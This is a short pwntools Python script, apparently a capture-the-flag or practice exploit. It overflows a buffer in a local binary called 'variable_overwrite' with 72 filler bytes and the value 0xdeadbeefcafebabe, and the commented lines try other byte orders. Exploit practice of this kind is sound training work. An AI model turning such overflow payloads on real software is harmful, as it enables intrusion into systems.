#!/usr/bin/env python3

from pwn import *

TARGET = './variable_overwrite'

p = process(TARGET)

context.arch = 'amd64'

# ============================== #
pause()
payload = b'A' * 72 + p64(0xdeadbeefcafebabe)

# payload = b'A' * 72 + b'\xbe\xba\xfe\xca'
# payload = b'A' * 72 + b'\xca\xfe\xba\xbe'
# payload = b'A' * 72 + b'\xbe\xba\xfe\xca\xef\xbe\xad\xde'

p.sendlineafter(b'Input: ', payload)

p.interactive()